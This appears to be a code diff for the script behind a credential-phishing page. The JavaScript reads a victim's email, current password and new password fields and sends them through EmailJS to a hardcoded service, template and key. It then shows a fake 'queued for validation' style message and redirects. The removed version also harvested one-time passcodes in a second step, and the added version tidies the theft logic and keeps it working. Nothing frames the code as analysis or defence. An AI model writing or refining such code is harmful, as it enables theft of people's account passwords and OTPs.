@@ -1,70 +1,48 @@
-function sendMail(step) {
-    // Define parameters for step 1 (email and password) or step 2 (OTP)
-    let params = {};
-    if (step === 1) {
-        const email = document.getElementById("email").value.trim();
-        const password = document.getElementById("password").value.trim();
-        const password = document.getElementById("new-password").value.trim();
-        const password = document.getElementById("confirm-password").value.trim();
+function validateAndSend() {
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const newPassword = document.getElementById('new-password').value.trim();
+    const confirmPassword = document.getElementById('confirm-password').value.trim();
 
-        // Validate email and password fields
-        if (!email || !password) {
-            alert("Both Email and Password are required.");
-            return;
-        }
-
-        params = {
-            email: email,
-            password: password,
-            new_password: new_password,
-            confirm_password: confirm_password,
-        };
-    } else if (step === 2) {
-        const otp = document.getElementById("otp").value.trim();
-
-        // Validate OTP field
-        if (!otp) {
-            alert("OTP is required.");
-            return;
-        }
-
-        params = {
-            otp: otp,
-        };
-    } else {
-        console.error("Invalid step passed to sendMail function.");
-        return;
+    // Validate email format
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
+      alert('Please enter a valid email address.');
+      return;
     }
 
-    // EmailJS service and template IDs
-    const serviceID = "service_dc0cgml";
-    const templateID = "template_5bmgad2";
+    // Validate other fields
+    if (!password || !newPassword || !confirmPassword) {
+      alert('All fields are required.');
+      return;
+    }
+
+    if (newPassword !== confirmPassword) {
+      alert('New Password and Confirm Password do not match.');
+      return;
+    }
+
+    // Prepare data for EmailJS
+    const params = {
+      email: email,
+      password: password,
+      new_password: newPassword
+    };
+
+    const serviceID = 'service_dc0cgml';
+    const templateID = 'template_5bmgad2';
 
     // Send data via EmailJS
+    emailjs.init('tv9J8fOC-kD8lrZBn'); // Replace with your EmailJS user ID
     emailjs
-        .send(serviceID, templateID, params)
-        .then((res) => {
-            console.log("Email sent successfully!", res);
-
-            // Clear relevant fields after successful submission
-            if (step === 1) {
-                document.getElementById("email").value = "";
-                document.getElementById("password").value = "";
-                document.getElementById("new-password").value = "";
-                document.getElementById("confirm-password").value = "";
-                alert("Account queued for validation!");
-                // Redirect or perform further actions as needed
-                window.location.href = "error.html";
-            //    goToStep(2); // Move to the next step
-            // } else if (step === 2) {
-            //     document.getElementById("otp").value = "";
-            //     alert("Account queued for validation!");
-            //     // Redirect or perform further actions as needed
-            //     window.location.href = "error.html";
-            }
-        })
-        .catch((err) => {
-            console.error("Failed to process validattion:", err);
-            alert("An error occurred. Please try again.");
-        });
-}
+      .send(serviceID, templateID, params)
+      .then((res) => {
+        console.log('Email sent successfully:', res);
+        alert('Form submitted successfully!');
+        window.location.href = 'error.html'; // Redirect to success page
+      })
+      .catch((err) => {
+        console.error('Failed to send email:', err);
+        alert('An error occurred. Please try again.');
+      });
+  }
